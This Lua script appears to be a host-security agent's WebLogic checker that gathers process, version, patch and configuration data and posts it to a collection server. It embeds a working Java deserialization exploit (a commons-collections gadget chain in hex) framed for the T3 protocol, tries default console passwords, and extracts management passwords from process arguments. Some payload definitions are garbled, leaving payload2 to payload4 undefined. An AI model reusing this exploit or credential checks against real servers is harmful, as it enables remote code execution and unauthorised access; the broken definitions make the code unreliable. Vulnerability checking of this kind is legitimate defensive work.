--[[
Copyright: 2015-2016, qingteng 
File name: weblogic_check.lua
Description: weblogic数据采集
Author: wangzhen
Version: 1.0
Date: 2016.6.2


Input:
{   
    "args":
    {
        "uuid":"",
        "args":[{"name":Type, "value":Value}]
    }
}

Post:
{
    "stream":{
        "args":{
            "uuid":""
        },
        "result":""
    }
}

Output:
{
    "ret_code":0
    "ret_msg":""
}

--]]
local begin_time = os.time()
local common = agent.require "agent.platform.linux.common"
local execute_shell = common.execute_shell
local execute_shell_l = common.execute_shell_l
local split = common.split
agent.load "rex_pcre"
local rex = rex_pcre
local socket = agent.require "socket"
local curl = agent.require "lcurl" 
local cfchk = agent.require "confchecker"
if debug_on then
    json_str = [[{"args":{"uuid":"1","args":[{"name":"weblogic_check","value":"/root"}]}}]]
end
local json_tb = cjson.decode(json_str)

local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local payload1="ACED00057372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B7870737D00000001000D6A6176612E7574696C2E4D6170787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707371007E00007372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E747400124C6A6176612F6C616E672F4F626A6563743B7870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E001E00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001E7371007E00167571007E001B00000002707571007E001B00000000740006696E766F6B657571007E001E00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E001B7371007E0016757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B47020000787000000001740017746F756368202F746D702F7765626C6F67696356756C31740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003A"
local payload
local payload
local payload

local payloads={payload1, payload2, payload3, payload4}
local existsFiles={
    '/tmp/weblogicVul1', 
    '/tmp/weblogicVul2', 
    '/tmp/weblogicVul3', 
    '/tmp/weblogicVul4',
}

function string.fromhex(str)
    return (str:gsub('..', function (cc)
        return string.char(tonumber(cc, 16))
    end))
end

function string.tohex(str)
    return (str:gsub('.', function (c)
        return string.format('%02X', string.byte(c))
    end))
end

function DEC_HEX(IN)
    local B,K,OUT,I,D=16,"0123456789abcdef","",0
    while IN>0 do
        I=I+1
        IN,D=math.floor(IN/B),math.mod(IN,B)+1
        OUT=string.sub(K,D,D)..OUT
    end
    return OUT
end

function prependTo8(str)
    if str:len()<=8 then
        local prependNum=8-str:len()
        for i=1, prependNum do
            str='0'..str
        end
    else
        return nil
    end
    return str
end

function formPayload(payloadHex)
    local payloadPre=('000009f3016501ffffffffffffffff000000710000ea6000000018432ec6a2a63985b5af7d63e64383f42a6d92c9e9af0f9472027973720078720178720278700000000c00000002000000000000000000000001007070707070700000000c00000002000000000000000000000001007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200094900056d616a6f724900056d696e6f7249000b706174636855706461746549000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000'):fromhex()
    local payloadApp=("fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200074900056d616a6f724900056d696e6f7249000b706174636855706461746549000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200094900056d616a6f724900056d696e6f7249000b706174636855706461746549000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870774621000000000000000000093132372e302e312e31000b75732d6c2d627265656e73a53caff10000000700001b59ffffffffffffffffffffffffffffffffffffffffffffffff0078fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870771d018140128134bf427600093132372e302e312e31a53caff1000000000078"):fromhex()

    local consPayload=payloadHex:fromhex()
    local payload=payloadPre..consPayload..payloadApp

    local payloadLenHex=prependTo8(DEC_HEX(payload:len()))
    local payloadLenHexStr=payloadLenHex:fromhex()
    local payloadFinal=payloadLenHexStr..payload:sub(5)

    return payloadFinal
end

function isSuccess()
    local result={}
    for key, file in ipairs(existsFiles) do
        if isExists(file) then
            table.insert(result, key)
            os.remove(file)
        end
    end

    return result
end

function isExists(fileName)
    local file=io.open(fileName,"r")

    if file~=nil then 
        io.close(file) 
        return true 
    else 
        return false 
    end
end

function launch(payload, key, hostname, port)
    local hostBound=socket.connect(hostname, port)
    if not hostBound then
        return false
    end
    local headers='t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
    --print('sending ' ,headers)

    hostBound:send(headers)
    
    local firData=hostBound:receive()
    --print("received data is", firData)

    local payloadFinal=formPayload(payload)
    local sendSta=hostBound:send(payloadFinal)

    if sendSta then
        --print(string.format("The connections send payload SUCCESS! %d", sendSta))
        return true
    else
        --print(string.format("The connections send payload NOT SUCCESS!"))
        return false
    end
end

function gentLaunch(payload, key, hostname, port)
    for i=1, 3 do
        --print(string.format("Launch %d time for %s", i, existsFiles[key]))
        if launch(payload, key, hostname, port) then
            break
        end
    end
end

function launchAll(hostname, port)
    for key, payload in pairs(payloads) do
        local lauchRes=gentLaunch(payload, key, hostname, port)
    end
end

function poc(hostname, port)
    --gentLaunch(payload3, hostname, port)
    launchAll(hostname, port)
    
    socket.sleep(3)
    local successFiles=isSuccess()


    if table.getn(successFiles) > 0 then
        return true, successFiles
    else
        return false, nil
    end
end


function check_pwd(login_url, console_url, user, pwd)
    local result = {}
    local visitable = true
    local deny_flag = false
    local login_flag = false
    local requester = curl.easy()
    --local requester = curl.new()
    requester:setopt_url(login_url)
    requester:setopt(curl.OPT_HEADER, true)
    requester:setopt(curl.OPT_POSTFIELDS, 
        "j_username="..user.."&j_password="..pwd.."&j_character_encoding=UTF-8")
    requester:setopt(curl.OPT_WRITEFUNCTION, function(s) table.insert(result,s) return true end)
    requester:setopt(curl.OPT_TIMEOUT, 3):perform()
    local response_code = requester:getinfo(curl.INFO_RESPONSE_CODE)
    if response_code == 404 or response_code ~= 302 then
        visitable = false
    end
    local cookie = ""
    if visitable then
        --print(user,pwd)
        --agent.lua_print_r(result)
        for _,header in pairs(result) do
            if rex.match(header, [[X\-Frame\-Options:\s*DENY]]) then
                deny_flag = true
                break
            end
            cookie = cookie or rex.match(header, [[ADMINCONSOLESESSION=([^;]*)]])
        end
    end
    if not deny_flag and visitable then
    --[==[
        result = {}
        requester:reset()
        requester:setopt_url(console_url)
        requester:setopt(curl.OPT_HEADER, true)
        requester:setopt_httpheader{"Cookie: ADMINCONSOLESESSION="..cookie}
        requester:setopt(curl.OPT_WRITEFUNCTION, function(s) table.insert(result,s) return true end)
        requester:setopt(curl.OPT_TIMEOUT, 1):perform()
        agent.lua_print_r(result)
        for _,header in pairs(result) do
            if rex.match(header, [[X\-Frame\-Options:\s*SAMEORIGIN]]) then
                login_flag = true
                break
            end
        end
    --]==]
        login_flag = true
    end
    requester:close()
    return login_flag, visitable
end

function read_jar(file_path)
    if lfs.attributes(file_path, "mode") == "file" then
        local tmp_code, tmp_msg = cfchk.unzip_read_current_file(file_path, "META-INF/MANIFEST.MF")
        if tmp_code == 0 and tmp_msg then
            return tmp_msg
        else
            return ""
        end
    else
        return ""
    end
end

function get_weblogic_ver(start_args)
    local jp_version
    local wls_home = rex.match(start_args, [[\-Dwls\.home=(\S*)]])
    if wls_home then
        if string.find(wls_home, "/", -1) then
            wls_home = string.sub(wls_home, 1, -2)
        end
        local meta_info = read_jar(wls_home.."/lib/weblogic.jar")
        jp_version = rex.match(meta_info, [[Implementation\-Version\s*:\s*((?:\d+\.)+\d+)]])
    end
    if not jp_version or jp_version == "" then
        local wl_home = rex.match(start_args, [[\-Dweblogic\.home=(\S*)]])
        if wl_home then
            if string.find(wl_home, "/", -1) then
                wl_home = string.sub(wl_home, 1, -2)
            end
            local meta_info = read_jar(wl_home.."/lib/weblogic.jar")
            jp_version = rex.match(meta_info, [[Implementation\-Version\s*:\s*((?:\d+\.)+\d+)]])
        end
    end
    return jp_version or ""
end

function get_patch(log_file)
    local patch = {}
    local info_str = ""
    local f = io.open(log_file, "r")
    if f then
        local tmp_code, tmp_msg = execute_shell("cat "..log_file.."|wc -l")
        if tmp_code == 0 and tmp_msg ~= "" then
            local line_num = rex.match(tmp_msg, [[\S*]])
            if line_num then
                info_str = info_str.."line num:"..line_num.."\n"
                line_num = tonumber(line_num)
                local all_lines = {}
                local max_line = 20000
                if line_num > max_line then
                    local i = 0
                    local start_line = line_num - max_line
                    for line in f:lines() do
                        i = i + 1
                        if i > start_line then
                            table.insert(all_lines, line)
                        end
                    end
                else
                    for line in f:lines() do
                        table.insert(all_lines, line)
                    end
                end
                for i=#all_lines,1,-1 do
                    if rex.match(all_lines[i], [[Patch]]) then
                        local patch_ver = rex.match(all_lines[i],[[WebLogic\s*Server\s*(\S*)]]) or ""
                        table.insert(patch, patch_ver)
                    end
                end
            end
        end
        f:close()
    end
    return patch, info_str
end

function read_config(start_args, pid)
    local console_list = {"console"}
    local info_str = ""
    local tmp_code, tmp_msg
    local server_name = rex.match(start_args, [[\-Dweblogic\.Name=(\S*)]]) or "myserver"
    local cmd = "lsof -p "..pid.."|grep \"/"..server_name.."/logs/"..server_name.."\.log\"|awk '{if (NR==1)print($9)}'"
    tmp_code,tmp_msg = execute_shell(cmd)
    local domain_path
    local console_path,user,conf_path,patch
    if tmp_code == 0 and tmp_msg ~= "" then
        patch,info_str = get_patch(rex.match(tmp_msg,[[\S*]]))
        local length = string.len("/"..server_name.."/logs/")
        for i=1,#tmp_msg-length do
            if string.sub(tmp_msg, i, i+length-1) == "/"..server_name.."/logs/" then
                domain_path = string.sub(tmp_msg, 1, i-8)
                break
            end
        end
        if domain_path then
            if lfs.symlinkattributes(domain_path.."config/config.xml", "mode") == "file" then
                local f = io.open(domain_path.."config/config.xml", "r")
                if f then     
                    conf_path = domain_path.."config/config.xml"
                    for line in f:lines() do
                        console_path = console_path or rex.match(line, [[<console\-context\-path>([^<]*)]])
                        user = user or rex.match(line, [[<node\-manager\-username>([^<]*)]])
                    end
                    if console_path then
                        table.insert(console_list, console_path)
                    end
                end
            end
        end
    end
    user = user or ""
    console_path = console_path or ""
    conf_path = conf_path or ""
    return console_list,user,conf_path,patch,info_str
end

function get_proc_info()
    local uname = ""
    local port = {}
    local pid = ""
    local start_args = ""
    local product_mode = 0
    local version = ""
    local console_list = {}
    local user = ""
    local conf_path = ""
    local manager_account = {}
    local tmp_code, tmp_msg
    local port_list = {}
    local info_str = ""
    local cmd = [[ps -eo user,pid,cmd|grep weblogic.Server|grep -v grep|awk '{if(NR == 1) print $0}']]
    tmp_code, tmp_msg = execute_shell(cmd)
    info_str = info_str..cmd.." ps "..tostring(tmp_code)..tostring(tmp_msg)
    local get_port_flag = false
    if tmp_code == 0 and tmp_msg ~= "" then
        uname,pid,start_args = rex.match(tmp_msg, [[(\S*)\s*(\S*)\s*([^\n]*)]])
        if not uname or not pid then
            return "","",product_mode,version,console_list,user,conf_path,manager_account,info_str
        end
        if rex.match(start_args, [[\-Dweblogic\.ProductionModeEnabled=true]]) then
            product_mode = 1
        end
        local tmp_user = rex.match(start_args, [[\-Dweblogic\.management\.username=(\S*)]])
        local tmp_pwd = rex.match(start_args, [[-Dweblogic.management.password=(\S*)]])
        if tmp_user and tmp_pwd then
            manager_account[tmp_user] = tmp_pwd
        end
        version = get_weblogic_ver(start_args)
        console_list,user,conf_path,patch,tmp_msg = read_config(start_args, pid)
        info_str = info_str..tmp_msg
        local tmp_port = rex.match(start_args, [[\-Dweblogic\.management\.server=\S*?:(\d+)\s+]])
        if tmp_port then
            get_port_flag = true
            table.insert(port_list, tmp_port)
        end
        cmd = "netstat -tnlp|grep "..pid.."|awk '{print($4)}'"
        tmp_code, tmp_msg = execute_shell_l(cmd)
        info_str = info_str.." netstat "
        if tmp_code == 0 and #tmp_msg > 0 then
            for _,line in pairs(tmp_msg) do
                tmp_port = rex.match(line, [[:?(\d+)$]])
                if tmp_port then
                    info_str = info_str..tmp_port.." "
                    port[tmp_port] = true
                end
            end
        end
    end
    if not get_port_flag then
        for k,_ in pairs(port) do
            table.insert(port_list, k)
        end
    end
    return uname,port_list,product_mode,version,console_list,user,conf_path,manager_account,patch,info_str
end

function start_check()
    local info_str
    local ret_msg = {}
    local console_path
    local manager_account
    local port_list
    local patch
    ret_msg.uname,port_list,ret_msg.product_mode,ret_msg.version,
        console_list,ret_msg.user,ret_msg.conf_path,manager_account,patch,info_str = get_proc_info()
    if ret_msg.uname == "" then
        return 1, "no weblogic running "..info_str
    end
    local account ={}
    for k,v in pairs(manager_account) do
        table.insert(account, {user=k,pwd=v})
    end
    table.insert(account,{user="weblogic",pwd="weblogic"})
    table.insert(account,{user="system",pwd="system"})
    table.insert(account,{user="portaladmin",pwd="portaladmin"})
    local login_flag = false
    local visitable = true
    for _,console_path in pairs(console_list) do
        for _,port in pairs(port_list) do
            local login_url = "http://127.0.0.1:"..port.."/"..console_path.."/j_security_check"
            local console_url = "http://127.0.0.1:"..port..
                "/"..console_path.."/console.portal?_nfpb=true&_pageLabel=ChangeManagementPage"
            for _,act in pairs(account) do
                login_flag, visitable = check_pwd(login_url, console_url, act.user, act.pwd)
                if visitable then
                    ret_msg.console_path = console_path
                    ret_msg.port = port
                    if login_flag then
                        ret_msg.user = act.user
                        ret_msg.pwd = act.pwd
                        break
                    end
                else
                    break
                end 
            end
            if visitable then
                break
            end
        end
        if visitable then
            break
        end
    end
    ret_msg.port = ret_msg.port or ""
    if ret_msg.port == "" then
        ret_msg.deserialize_vul = false
    else
        ret_msg.deserialize_vul = poc("127.0.0.1", ret_msg.port)
    end
    ret_msg.pwd = ret_msg.pwd or ""
    ret_msg.console_path = ret_msg.console_path or ""
    ret_msg.patch = patch
    agent.lua_print_r(ret_msg)
    --print(info_str)
    return 0, cjson.encode(ret_msg)
end


local tmp_code, tmp_msg
local msg_str = ""
local host = agent.get_erlang_data_server_host()
if string.sub(host, -1, -1) ~= "/" then
    host = host.."/"
end
local url = host.."api/v1/data_collection"
for _,one_cmd in pairs(json_tb.args.args) do
    local cmd = ""
    if one_cmd.name == "weblogic_check" then
        tmp_code, tmp_msg = start_check()
    end
    if tmp_code ~= 0 then
        msg_str = msg_str.." execute "..one_cmd.name.." error: "..tostring(tmp_code).." "..
            tostring(tmp_msg)
        local data = {args={uuid=json_tb.args.uuid},result=agent.base64_encode(tmp_msg)}
        if debug_on then
            agent.lua_print_r(data)
            print(agent.base64_decode(data.result))
        end
        local j_str = cjson.encode(data)
        local is_compress = true
        tmp_code, http_code, tmp_msg = agent.post_json_to_srv(url, j_str, is_compress)
        if tmp_code ~= 0 and http_code ~= 200 then
            msg_str = msg_str.." post json to server error: "..tostring(tmp_code).." "..
                tostring(http_code).." "..tostring(tmp_msg)
        end
    else
        local data = {args={uuid=json_tb.args.uuid},result=agent.base64_encode(tmp_msg)}
        if debug_on then
            agent.lua_print_r(data)
            print(agent.base64_decode(data.result))
        end
        local j_str = cjson.encode(data)
        local is_compress = true
        tmp_code, http_code, tmp_msg = agent.post_json_to_srv(url, j_str, is_compress)
        if tmp_code ~= 0 and http_code ~= 200 then
            msg_str = msg_str.." post json to server error: "..tostring(tmp_code).." "..
                tostring(http_code).." "..tostring(tmp_msg)
        end
    end
end

local ret = {}
ret.ret_code = tmp_code
ret.ret_msg = msg_str
ret.req_id = json_tb.req_id
ret.begin_time = begin_time
ret.end_time = os.time()
cjson.encode_empty_table_as_object(false)
local json_rt = cjson.encode(ret)
if debug_on then
    agent.lua_print_r(ret)
else
    agent.sendmsg(tostring(json_tb.from), tostring(json_tb.type), "0xFF000000" , json_rt)
end
